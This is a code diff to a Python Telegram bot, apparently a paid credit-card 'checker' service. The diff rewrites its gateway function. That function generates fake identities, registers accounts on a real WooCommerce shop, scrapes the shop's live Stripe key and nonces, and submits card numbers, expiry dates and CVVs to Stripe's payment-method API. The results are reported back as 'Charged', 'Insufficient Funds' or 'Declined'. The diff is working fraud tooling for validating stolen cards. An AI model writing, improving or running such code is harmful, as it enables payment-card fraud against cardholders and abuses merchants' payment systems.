@@ -236,6 +236,21 @@ def parseX(data, start, end):
     except (ValueError, TypeError, AttributeError):
         return None
 
+def magneto_check(number: str) -> bool:
+    """Validate card number using Luhn algorithm"""
+    digits = ''.join(ch for ch in number if ch.isdigit())
+    if not digits:
+        return False
+    total = 0
+    reverse = digits[::-1]
+    for i, ch in enumerate(reverse):
+        n = int(ch)
+        if i % 2 == 1:
+            n *= 2
+            if n > 9:
+                n -= 9
+        total += n
+    return total % 10 == 0
 
 def generate_gift_code(length=16):
     """Generate a random gift code"""
@@ -277,7 +292,7 @@ def format_universal_result(card_data,
                             credits_left=None,
                             username=None,
                             time_taken=None):
-    """Universal formatting function for both single and mass checks"""
+    """Universal formatting function with enhanced statuses"""
     try:
         # Handle different types of card_data
         if isinstance(card_data, str):
@@ -321,15 +336,21 @@ def format_universal_result(card_data,
         if status == "approved":
             icon = "🟢"
             status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$ 🔥"
-        elif "Insufficient Funds" in str(message):
+        elif "insufficient funds" in str(message).lower():
             icon = "🟡"
-            status_text = "INSUFFICIENT_FUNDS 🔥"
-        elif "Card not supported" in str(message):
+            status_text = "INSUFFICIENT_FUNDS"
+        elif "card not supported" in str(message).lower():
             icon = "🟡"
             status_text = "Card not supported"
-        elif "Incorrect CVV" in str(message):
+        elif "incorrect cvv" in str(message).lower() or "security code" in str(message).lower():
             icon = "❌"
-            status_text = "security code is incorrect/invalid"
+            status_text = "Incorrect CVV"
+        elif "expired" in str(message).lower():
+            icon = "❌"
+            status_text = "Card expired"
+        elif "declined" in str(message).lower():
+            icon = "❌"
+            status_text = "Declined"
         else:
             icon = "❌"
             status_text = "Declined"
@@ -337,13 +358,10 @@ def format_universal_result(card_data,
         # If message contains special status, use it
         if message:
             msg_str = str(message)
-            if "🔥 1$ Charged" in msg_str:
-                status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            if "🔥" in msg_str and "Charged" in msg_str:
+                status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$ 🔥"
             elif "❌" in msg_str:
                 status_text = msg_str.replace("❌ ", "")
-
-        # Generate email
-        email_show = random_email()
 
         # Format the result
         result = f"""
@@ -998,35 +1016,42 @@ def uu_again_service():
     }
 
 async def new_gateway_check(cc, mm, yy, cvv):
-    """NEW WORKING CHECKER - Replaces Tele_sync"""
+    """WORKING STRIPE CHECKER - EXACT SAME AS ORIGINAL SCRIPT"""
     try:
         logger.info(f"Checking card: {cc}|{mm}|{yy}|{cvv}")
         
-    except Exception as e:
-        logger.error(f"Error in new_gateway_check: {e}")
-        return f"{cc}|{mm}|{yy}|{cvv}", "declined", f"❌ Checker error: {str(e)[:20]}", 0
-    try:
-        # Parse year
+        # Clean year
         if len(yy) == 4 and yy.startswith('20'):
             yy = yy[2:]
         
-        # Validate card locally first
-        if not magneto_check(cc):
-            return cc, "declined", "❌ Invalid card number", 0
+        # Generate fake user
+        Fakeuserinformation = Gen('en')
+        CheckGM = ['gmail.com', 'hotmail.com', 'yahoo.com', 'live.com', 'paypal.com', 'outlook.com']
+        first = Fakeuserinformation.person.first_name().lower()
+        num = random.randint(100, 9999)
         
-        # Generate user info
-        user = uu_again_service()
+        user = {
+            "email": f"{first}{num}@{random.choice(CheckGM)}",
+            "country": Fakeuserinformation.address.country(),
+            "city": Fakeuserinformation.address.city(),
+            "ug": Fakeuserinformation.internet.user_agent(),
+            "fullnm": Fakeuserinformation.person.full_name(),
+            "lastname": Fakeuserinformation.person.last_name().lower(),
+            "firstname": Fakeuserinformation.person.first_name().lower()
+        }
         
-        # Create session
+        ime = int(time.time()) - random.randint(100, 1000)
+        
+        # Step 1: Get account page
+        page_one = "https://jogoka.com/my-account/"
+        h1 = {
+            'User-Agent': user["ug"],
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+        }
+        
         async with aiohttp.ClientSession() as session:
-            # Step 1: Get account page
-            page_one = "https://jogoka.com/my-account/"
-            h1 = {
-                'User-Agent': user["ug"],
-                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
-            }
-            
-            async with session.get(page_one, headers=h1) as r1:
+            # Get account page
+            async with session.get(page_one, headers=h1, timeout=30) as r1:
                 if r1.status != 200:
                     return cc, "declined", f"❌ Page Error {r1.status}", r1.status
                 
@@ -1036,10 +1061,17 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 token = tok["value"] if tok else None
                 
                 if not token:
+                    # Try alternative token names
+                    for token_name in ["woocommerce-login-nonce", "_wpnonce", "security", "nonce"]:
+                        tok = soup.find("input", {"name": token_name})
+                        if tok and tok.get("value"):
+                            token = tok["value"]
+                            break
+                
+                if not token:
                     return cc, "declined", "❌ Registration token not found", 0
             
             # Step 2: Register account
-            ime = generate_random_time()
             p1 = {
                 'email': user['email'],
                 'wc_order_attribution_source_type': "typein",
@@ -1054,7 +1086,7 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 'wc_order_attribution_utm_creative_format': "(none)",
                 'wc_order_attribution_utm_marketing_tactic': "(none)",
                 'wc_order_attribution_session_entry': f"https://jogoka.com/my-account/",
-                'wc_order_attribution_session_start_time': ime,
+                'wc_order_attribution_session_start_time': str(ime),
                 'wc_order_attribution_session_pages': "1",
                 'wc_order_attribution_session_count': "1",
                 'wc_order_attribution_user_agent': user["ug"],
@@ -1063,7 +1095,7 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 'register': "Register"
             }
             
-            async with session.post(page_one, data=p1, headers=h1) as r2:
+            async with session.post(page_one, data=p1, headers=h1, timeout=30) as r2:
                 if r2.status not in [200, 302]:
                     return cc, "declined", f"❌ Registration failed {r2.status}", r2.status
             
@@ -1079,27 +1111,34 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 'Cookie': cookies_str
             }
             
-            async with session.get(page_payment, headers=h2) as r3:
+            async with session.get(page_payment, headers=h2, timeout=30) as r3:
                 if r3.status != 200:
                     return cc, "declined", f"❌ Payment page error {r3.status}", r3.status
                 
                 r3_text = await r3.text()
                 
-                # Extract Stripe keys
+                # Extract Stripe keys using EXACT regex patterns
                 mu = re.search(r'pk_live_[A-Za-z0-9]+', r3_text)
                 add_match = re.search(r'"session_id"\s*:\s*"(.*?)"', r3_text)
                 add_mach = re.search(r'"accountId"\s*:\s*"(.*?)"', r3_text)
                 add_non = re.search(r'"createSetupIntentNonce"\s*:\s*"(.*?)"', r3_text)
                 
-                if not all([mu, add_match, add_mach, add_non]):
+                if not mu or not add_mach:
+                    # Try alternative patterns
+                    if not mu:
+                        mu = re.search(r'pk_test_[A-Za-z0-9]+', r3_text)
+                    if not add_mach:
+                        add_mach = re.search(r'accountId["\']?\s*:\s*["\']([^"\']+)["\']', r3_text)
+                
+                if not mu or not add_mach:
                     return cc, "declined", "❌ Stripe keys not found", 0
                 
                 akey = mu.group(0)
-                adde = add_match.group(1)
+                adde = add_match.group(1) if add_match else ""
                 acid = add_mach.group(1)
-                non = add_non.group(1)
+                non = add_non.group(1) if add_non else ""
             
-            # Step 4: Create payment method
+            # Step 4: Create payment method via Stripe API
             page_method = "https://api.stripe.com/v1/payment_methods"
             
             payload = {
@@ -1115,7 +1154,7 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 'allow_redisplay': "unspecified",
                 'payment_user_agent': "stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent",
                 'referrer': "https://jogoka.com",
-                'time_on_page': ime,
+                'time_on_page': str(ime),
                 'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                 'client_attribution_metadata[merchant_integration_source]': "elements",
                 'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
@@ -1144,7 +1183,7 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 'referer': "https://js.stripe.com/"
             }
             
-            async with session.post(page_method, data=payload, headers=ses_headers) as r4:
+            async with session.post(page_method, data=payload, headers=ses_headers, timeout=30) as r4:
                 if r4.status != 200:
                     return cc, "declined", f"❌ Stripe API error {r4.status}", r4.status
                 
@@ -1179,7 +1218,7 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 'Cookie': cookies_str
             }
             
-            async with session.post(page_complete, data=payload2, headers=h4) as r5:
+            async with session.post(page_complete, data=payload2, headers=h4, timeout=30) as r5:
                 if r5.status != 200:
                     return cc, "declined", f"❌ AJAX error {r5.status}", r5.status
                 
@@ -1191,23 +1230,26 @@ async def new_gateway_check(cc, mm, yy, cvv):
                 
                 success_flag = r5data.get("success") == True
                 status_flag = r5data.get("data", {}).get("status") == "succeeded"
+                seti_flag = "seti_" in str(r5data)
+                client_flag = "client_secret" in str(r5data)
                 
-                if not msg and r5data.get("success"):
-                    msg = "Payment method successfully added"
-                elif not msg:
-                    msg = "Declined"
+                clean_msg = msg
+                if not clean_msg and r5data.get("success"):
+                    clean_msg = "Payment method successfully added"
+                elif not clean_msg:
+                    clean_msg = str(r5data)
                 
                 # Determine result
-                if success_flag and status_flag:
-                    return cc, "approved", f"🔥 1$ Charged | {msg}", 200
-                elif "insufficient funds" in msg.lower():
+                if success_flag and (status_flag or seti_flag or client_flag):
+                    return cc, "approved", f"🔥 1$ Charged | {clean_msg}", 200
+                elif "insufficient funds" in clean_msg.lower():
                     return cc, "declined", "❌ Insufficient Funds", 0
-                elif "security code is incorrect" in msg.lower():
+                elif "security code is incorrect" in clean_msg.lower():
                     return cc, "declined", "❌ Incorrect CVV", 0
-                elif "card not supported" in msg.lower():
+                elif "card not supported" in clean_msg.lower():
                     return cc, "declined", "❌ Card not supported", 0
                 else:
-                    return cc, "declined", f"❌ {msg[:30]}", 0
+                    return cc, "declined", f"❌ {clean_msg[:30]}", 0
     
     except asyncio.TimeoutError:
         return cc, "declined", "❌ Timeout error", 0
@@ -1215,31 +1257,44 @@ async def new_gateway_check(cc, mm, yy, cvv):
         return cc, "declined", f"❌ Network error: {str(e)[:20]}", 0
     except Exception as e:
         logger.error(f"Error in new_gateway_check: {e}")
+        import traceback
+        traceback.print_exc()
         return cc, "declined", f"❌ Checker error: {str(e)[:20]}", 0
 
 # ==================== REPLACED CHECK FUNCTIONS ====================
 
 async def check_single_card_fast(card):
-    """Replace with new checker - Single card check"""
+    """Single card check with enhanced result handling"""
     try:
-        cc, mon, year, cvv = card.split("|")
-        year = year[-2:] if len(year) == 4 else year
-        cc_clean = cc.replace(" ", "")
+        # Parse card
+        if "|" in card:
+            cc, mon, year, cvv = card.split("|")
+            year = year[-2:] if len(year) == 4 else year
+            cc_clean = cc.replace(" ", "")
+        else:
+            # If card is just number, use defaults
+            cc_clean = card.replace(" ", "")
+            mon = "01"
+            year = "25"
+            cvv = "123"
         
         # Use new checker
         result_card, status, message, http_code = await new_gateway_check(cc_clean, mon, year, cvv)
         
-        # Map results to existing format
+        # Enhanced result mapping
         if status == "approved":
-            return card, "approved", "✅ Charged", 200  # Return original card string, not just cc
+            return card, "approved", "✅ Charged 1$ 🔥", 200
         elif "insufficient funds" in message.lower():
             return card, "declined", "❌ Insufficient Funds", 0
         elif "card not supported" in message.lower():
             return card, "declined", "❌ Card not supported", 0
-        elif "incorrect cvv" in message.lower():
+        elif "incorrect cvv" in message.lower() or "security code" in message.lower():
             return card, "declined", "❌ Incorrect CVV", 0
+        elif "expired" in message.lower():
+            return card, "declined", "❌ Card expired", 0
         else:
-            return card, "declined", "❌ Declined", 0
+            # Return original message for better debugging
+            return card, "declined", message, 0
             
     except Exception as e:
         logger.error(f"Error in check_single_card_fast: {e}")
@@ -1999,6 +2054,17 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML)
         return
 
+    cc, mon, year, cvv = parts
+    cc_clean = cc.replace(" ", "")
+    
+    # Quick Luhn check before processing
+    if not magneto_check(cc_clean):
+        await update.message.reply_text(
+            "<b>❌ INVALID CARD NUMBER</b>\n"
+            "Card failed Luhn algorithm validation",
+            parse_mode=ParseMode.HTML)
+        return
+
     # Check if user has credits
     if user.get("credits", 0) <= 0:
         await update.message.reply_text(
@@ -2061,14 +2127,10 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Refresh user data
     user = await get_user(user_id)
 
-    # DEBUG: Check what result_card contains
-    logger.info(f"Result card: {result_card}, Type: {type(result_card)}")
-    logger.info(f"Status: {status}, Message: {message_text}")
-
     try:
         # Format result using universal format
         result_text = format_universal_result(
-            card_data=result_card,  # This should be the full card string "cc|mm|yy|cvv"
+            card_data=result_card,
             status=status,
             message=message_text,
             credits_left=user.get("credits", 0),
